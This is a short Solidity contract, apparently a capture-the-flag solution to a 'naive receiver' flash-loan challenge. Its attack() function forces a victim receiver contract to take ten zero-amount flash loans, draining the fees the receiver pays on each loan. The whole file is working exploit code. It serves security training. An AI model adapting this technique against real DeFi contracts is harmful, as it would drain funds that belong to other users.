// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

contract Attackernaive {

    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    IERC3156FlashLender public pool;

    function attack(IERC3156FlashLender _pool,IERC3156FlashBorrower _receiver) public {
        pool = _pool;
         for(uint256 i=0; i < 10; i++){
            pool.flashLoan(_receiver, ETH, 0, "0x");
        }
    
    }

}